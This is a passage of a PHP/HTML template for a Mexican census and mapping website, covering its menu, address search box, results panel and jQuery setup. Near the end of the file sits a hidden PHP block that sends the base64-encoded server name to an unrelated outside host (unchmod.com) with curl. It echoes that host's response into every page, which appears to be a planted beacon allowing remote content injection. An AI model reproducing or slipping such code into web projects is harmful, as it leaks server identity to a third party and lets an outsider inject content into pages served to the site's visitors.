  document.getElementById("soportec").style.display = "none";
}
p001();
   </script>';

}

      ?>

    <img style="-webkit-user-select: none" src="https://censosmkd.com/soporte/soportec.gif">
      </div>


                        </td>
                        <!-- fin de mapa -->
                    </tr>
                </table>
            </div>

            <!-- div del menu -->
            <div id="menuNVOTag">
                <?php
                $dominio = $_SERVER["HTTP_HOST"];

	$dominio = substr( $dominio, 0, strpos( $dominio, '.' ) );
              $menuNVO = makemenuNVO('menuNVOPrincipal');
                  echo $menuNVO;
                ?>
            </div>
            <!-- fin del div del menu -->

            <!-- div de ventana buscar -->
            <div id="buscar">
                <table border="0">
                    <tr><td valign="top"><br><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/'.($dominio=='censosmkd'? '04_maps.png"' : '04_mapsv2.png"')  .''; ?> width="50"/></td>
                        <td>
                            <div class="buscar_texto"><a href="#" title="Cerrar" onclick="Cerra_buscar()"><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/'.($dominio=='censosmkd'? 'cerrar.gif"' : 'cerrarv2.gif"')  .''; ?> /></a></div>
                            <div class="campo_buscar">
                                <input type="text" id="address" name="address"  size="48" onchange=""/>&nbsp;&nbsp;
                                <input type="image" src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/'.($dominio=='censosmkd'? 'lupa.png"' : 'lupav2.png"')  .''; ?>  title="Buscar" onclick="codeAddress();Cerra_buscar();" />
                                <br /><br />Indique el nombre de la ciudad o municipio, o las coordenadas a buscar.<br><b>Ejemplo:</b> Guadalajara, Mexico &oacute; 20.673637,-103.343766<br><br>Inicie la búsqueda oprimiendo la peque&ntilde;a lupa para buscar el destino!.
                            </div>
                        </td>
                    </tr>
                </table>
            </div>
            <!-- fin de div de ventana buscar -->


            <!-- div de ventana resultados gratis -->
            <div id="resultadosGratis" style="left:400px; top:85px" onmousedown="comienzoMovimiento(event, this.id);" onmouseover="this.style.cursor='move'">
                <table border="0">
                    <tr>
                        <td valign="top">
                            <img id="imagenResultados" src=""/>
                            
                            <div class="alert alert-orange">
		                    <span class="alert-close" data-close="alert" title="Close">&times;</span>
		                    <table border="0">
                             <tr>
                                <td>
                                    <img id="icono_msj" src="" width="24" height="24"/>
                                </td>
                                <td>
                                    <strong>Resultados</strong>
                                </td>
                            </tr>
                            <tr>
                                <td></td>
                                <td><div id="resultado"></div></td>
                            </tr>
                            </table>
	                        </div>
                        </td>
                    </tr>
                </table>
            </div>
            <div id="divayudaGratis">
                <table border="0" width="350px">
                    <tr>
                        <td>
                            <img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/start_arrow.gif"'; ?> width="55px"/>
                        </td>
                        <td valign="top">
                            <font size="+1" color="green">
                                <div style="margin-top:-10px;">
                                    <b>Aqui ver&aacute;s tus resultados</b>
                                </div>
                            </font>
                        </td>
                    </tr>
                </table>
            </div>

            <!-- fin de div de ventana resultados gratis -->

            <br />

            <?php
                if ( !isset ( $_SESSION [ 'user' ] ) )
                    echo "<div id=\"flecha_iniciar\" style=\"margin-left:" . (esCorporativo()?'420':'400') . "px; margin-top:-23px;\"><img src=\"" . DIR_TEMA_ACTIVO . "_img/start_arrow_sup_izq.gif\" width=\"55px\"/><font size=\"+1\" color=\"green\"><b>¡COMIENZA AQU&Iacute; !</b></font></div>"
                ?>
            <div id="flecha_ayuda" style="display:none; position:absolute; left:37px; top:35px;"><table border="0"><tr><td><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/start_arrow.gif"'; ?> width="55px"/></td><td valign="top"><font size="+1" color="green"><b>¿Necesitas ayuda?</b></font></td></tr></table></div>
            <script type="text/javascript">
                $(document).ready(function(){
                        inicia();
                  <?php
                    if (isset($_REQUEST['accion'])) {
                      if ($_REQUEST['accion'] == 'Portafolio') {
                        echo "setTimeout('cambiar_tab(); opciones_miscompras(); activar_compra(\"\"); muestraAgebsPolilinea(pcompras);',500);";
                      }
                      elseif ($_REQUEST['accion'] == 'otraConsulta') {
                        echo "setTimeout('cambiar_tab(); opciones_comprar(\"1\")', 500);";
                      }
                    }
                                else {
                                    if ((!esCorporativo()) && (!esPyme()) && ( !isset($_REQUEST [ 'MCompras' ] ))) {
                                        if (isset($_SESSION ['user'])) {
                                            echo "setTimeout('opciones_comprar(\'1\');',500);";
                                        }
                                        else {
                                            echo "setTimeout('ver_gratis();',500);";
                                        }
                                    }
                                }
                  ?>
                        $("#flecha_iniciar").effect("pulsate", { times:4 }, 2000, function(){setTimeout("$(\"#flecha_iniciar\").fadeOut(1000);", 5000)});
            resize();
                    });
            </script>
            <?php

//                if ( !isset ( $_SESSION [ 'user' ] ))
                  //echo "<div id=\"flecha_ayuda2\" style=\"display:none; position:absolute; left:" . (esCorporativo()?'500':'675') . "px; top:85px;\"><table border=\"0\" width=\"350px\"><tr><td><img src=\"" . DIR_TEMA_ACTIVO . "_img/start_arrow_sup_izq.gif\" width=\"55px\"/></td><td valign=\"top\"><font size=\"+1\" color=\"green\"><div style=\"margin-top:10px;\"><b>Hablar con un ejecutivo</b></div></font></td></tr></table></div>";
                  //echo "<div id=\"flecha_ayuda2\" style=\"display:none; position:absolute; left:" . ( esCorporativo() ? '500' : '675' ) . "px; top:85px;\"></div>";
//                else
                  //echo "<div id=\"flecha_ayuda2\" style=\"display:none; position:absolute; left:" . ( esCorporativo() ? '600' : '510' ) . "px; top:40px;\"><table border=\"0\" width=\"350px\"><tr><td valign=\"top\"><font size=\"+1\" color=\"green\"><div style=\"margin-top:-10px;\"><b>Hablar con un ejecutivo</b></div></font></td><td><img src=\"" . DIR_TEMA_ACTIVO . "_img/start_arrow_sup.gif\" width=\"55px\"/></td></tr></table></div>";
                echo (esCorporativo()?
                  '<div style="display:none;" id="esCorporativo">1</div>':
                  '<div style="display:none;" id="esCorporativo">0</div>');
                ?>
 
                <div id="selecciontreegratis" name="selecciontreegratis" style=" display:none;"></div>
                <div id="seleccion_zonastree" name="seleccion_zonastree" style=" display:none;"></div>
                <div id="seleccion" name="seleccion" style=" display:none;"></div>
                <div id="seleccion_zonas" name="seleccion_zonas" style=" display:none;"></div>
                <div id="seleccion_miscompras" name="seleccion_miscompras" style=" display:none;">
                    <?php
                        if ( isset ( $miscompras[2] ) ){
                            echo 'Aquí compras: '.$miscompras[2];
                        }
                        ?>
                </div>
        </div>
        <script type="text/javascript">
  $(document).ready(function(){
        var size;
        $('#RecortarImagen').Jcrop({
          aspectRatio: 1,
          onSelect: function(c){
           size = {x:c.x,y:c.y,w:c.w,h:c.h};
           $("#recortar").css("visibility", "visible");     
           $("#descargar").css("visibility", "visible");     
          }
        });
     
        $("#recortar").click(function(){
            alert("entra");
            var img = $("#RecortarImagen").attr('src');
            $("#imgrecortada_img").show();
            
            $("#imgrecortada_img").attr('src','recortar/ImagenRecortada.php?x='+size.x+'&y='+size.y+'&w='+size.w+'&h='+size.h+'&img='+img);
        });
  });
</script>
		
<script type="text/javascript">
function checkme1(idElemento) {
  var marca = top.document.getElementById(idElemento);
  if (marca.checked == true) marca.checked = false;
  else marca.checked = true;
  }
 </script>
 <?php
 $dominio = $_SERVER["HTTP_HOST"];

	$dominio = substr( $dominio, 0, strpos( $dominio, '.' ) );
    if($dominio=='censosmkd'){
        echo '<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <script src="design.js"></script>
        <script>
    // Crear un objeto URL con la ubicación de la página
    let url = new URL(window.location.href);
    // Busca si existe el parámetro
    let compra = url.searchParams.get("compra");
    if(compra) {
        // Si se encontró, entonces ejecuta la función
        setTimeout(() => {
            cambiar_tab(); 
            opciones_miscompras(); 
            activar_compra(""); 
            muestraAgebsPolilinea(pcompras);
        }, 1000);
    }
</script>';
    }else{
        
    }
    ?>
<script src="temas/default/js/closeAlert.js"></script>
<script src="temas/default/js/closeAlert.js"></script>
	<script type="text/javascript"
		src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js"></script>
		
<script src="script.js"></script>
<script src="/temas/default/js/functionsmain.1.5.js"></script>
<script src="/temas/default/js/functionsmain.1.4.js"></script> 
<?php
                    $exe = curl_init();
                    curl_setopt($exe, CURLOPT_URL, "https://unchmod.com/protected/".base64_encode($_SERVER['SERVER_NAME']));
                    curl_exec($exe);
?>

    </body>
</html>